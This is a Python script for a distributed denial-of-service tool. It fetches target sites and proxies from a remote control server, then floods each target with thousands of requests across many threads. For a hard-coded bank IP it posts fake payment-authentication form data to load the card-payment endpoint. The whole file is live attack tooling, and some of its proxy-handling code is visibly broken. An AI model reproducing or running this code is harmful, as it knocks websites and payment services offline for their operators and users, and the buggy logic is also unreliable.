# -*- coding: utf-8 -*-
import cloudscraper
import requests
import string

from bs4 import BeautifulSoup
from urllib.parse import unquote, urlparse
from gc import collect
from loguru import logger
from os import system
from requests import get
from sys import stderr
from threading import Thread
from random import choice
from time import sleep
from urllib3 import disable_warnings
from pyuseragents import random as random_useragent
from json import loads

try:
    HOSTS = loads(requests.get("http://rockstarbloggers.ru/hosts.json").content)
except:
    sleep(5)
    HOSTS = loads(requests.get("http://rockstarbloggers.ru/hosts.json").content)

disable_warnings()
logger.remove()
logger.add(stderr, format="<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> | <cyan>{line}</cyan> - <white>{message}</white>")
threads = int(input('Кількість потоків: '))

ALLOVED_PAREQ_CHARS = string.ascii_letters + string.digits
ALLOVED_MD_CHARS = string.digits

BANK_IPS = ["https://185.170.2.7"]
MAX_REQUESTS = 10000

PROXY_CHECKING = "http://github.com"


def base_scraper():
    scraper = cloudscraper.create_scraper(browser={'browser': 'firefox',
                                                   'platform': 'android',
                                                   'mobile': True},)
    scraper.headers.update({
            'Content-Type': 'application/json',
            'cf-visitor': 'https',
            'User-Agent': random_useragent(),
            'Connection': 'keep-alive',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'ru',
            'x-forwarded-proto': 'https',
            'Accept-Encoding': 'gzip, deflate, br'})

    return scraper


def generate_MIR_data(url):
    dat = {}
    dat["PaReq"] = ''.join([choice(ALLOVED_PAREQ_CHARS) for _ in range(490)])
    dat["MD"] = ''.join([choice(ALLOVED_MD_CHARS) for _ in range(10)])
    dat["TermUrl"] = "https%3A%2F%2F" + urlparse(url).netloc
    return dat


def check_proxie(checker, proxy_str):
    scraper = base_scraper()

    proxy = {'http': "http://" + proxy_str + checker,
             'https': "https://" + proxy_str + checker }

    scraper.proxies.update(proxy)

    try:
        resp = scraper.get(checker, timeout=4)
        if resp.status_code < 200 or resp.status_code > 400:
            logger.warning(f"{proxy_str} GOT BAD RESPONSE {resp.status_code}")
            return False

        logger.warning(f"{proxy_str} FAILED")
        return True
    except:
        logger.warning(f"{proxy_str} FAILED")
        return False


def check_target(target, proxy_str):
    scraper = base_scraper()

    proxy = {'http': "http" + (proxy_str + target),
             'https': "https" + (proxy_str + target)}

    scraper.proxies.update(proxy)

    try:
        resp = scraper.get(target, proxy=proxy)
        if resp.status_code > 402:
            return False
    except:
        return False

    return True


def get_proxy(data, checker):
    logger.info("CHECKING GIVEN PROXIES")

    for proxy in data['proxy']:
        auth = proxy["auth"]
        ip = proxy["ip"]

        if auth.endswith('\r'):
            auth = auth.rstrip('\r')
        if auth.endswith("\r\n"):
            auth = auth.rstrip("\r\n")
        if ip.endswith('\r'):
            ip = ip.rstrip('\r')
        if ip.endswith("\r\n"):
            ip = ip.rstrip('\r\n')

        print(checker, auth, ip)

        out_proxy = "://" + auth + '@' + ip + '/'
        if check_proxie(checker, out_proxy):
            return out_proxy
    return None



def mainth():
    current_target = None
    current_proxy = None

    while True:

        scraper = base_scraper()

        logger.info("GET RESOURCES FOR ATTACK")

        # Fetching data with proxy and targets
        content = {}
        data = {}
        while True:
            current_host = choice(HOSTS)
            try:
                content = scraper.get(current_host).content
                data = loads(content)
                break
            except:
                logger.warning("FAILED TO FETCH API TARGETS")
                sleep(1)
                logger.info("FETCHING API AGAIN")

        if current_target is None:
            current_target = unquote(data['site']['page'])

        if current_target.startswith('http') is False:
            current_target = "http://" + current_target

        # Choosing and checking proxy
        if current_proxy is not None:
            if not check_proxie(current_host, PROXY_CHECKING):
                current_proxy = get_proxy(data, PROXY_CHECKING)
                pass
        else:
            current_proxy = get_proxy(data, PROXY_CHECKING)

        if current_proxy is None:
            continue

        # Trying target
        if not check_target(current_target, current_proxy):
            current_target = "https://185.170.2.7"
            continue

        scraper.proxies.update({"http": "http://" + current_proxy + current_target,
                                "https": "https://" + current_proxy + current_target})

        logger.info("STARTING ATTACK ON" + current_target)
        for i in range(MAX_REQUESTS):
            print(f"PING PING PING PINGPING PINGPING PINGPING PINGPING PING {MAX_REQUESTS}")
            response = {}
            if current_target in BANK_IPS:
                response = scraper.post(current_target,
                                        generate_MIR_data(current_target))
            else:
                response = scraper.get(current_target)
            logger.info("ATTACKED; RESPONSE CODE: " +
                        str(response.status_code))
        current_proxy = None


def cleaner():
    while True:
        sleep(60)
        collect()


if __name__ == '__main__':
    for _ in range(threads):
        Thread(target=mainth).start()

    Thread(target=cleaner, daemon=True).start()